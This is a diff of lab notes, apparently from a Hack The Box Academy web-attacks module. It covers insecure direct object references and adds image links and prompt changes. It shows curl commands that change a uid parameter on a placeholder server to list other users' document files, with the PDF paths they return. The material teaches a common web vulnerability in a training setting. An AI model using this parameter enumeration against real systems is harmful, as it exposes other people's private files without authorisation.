@@ -23,10 +23,16 @@
 
 ## Insecure Parameters
 
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_employee_manager.jpg)
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)
+
 ``` html
 /documents/Invoice_1_09_2021.pdf
 /documents/Report_1_10_2021.pdf
 ```
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_documents.jpg)
 
 ``` html
 /documents/Invoice_2_08_2020.pdf
@@ -41,14 +47,14 @@
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
+[!bash!]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
 
 <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
 <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+[!bash!]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
 
 /documents/Invoice_3_06_2020.pdf
 /documents/Report_3_01_2020.pdf
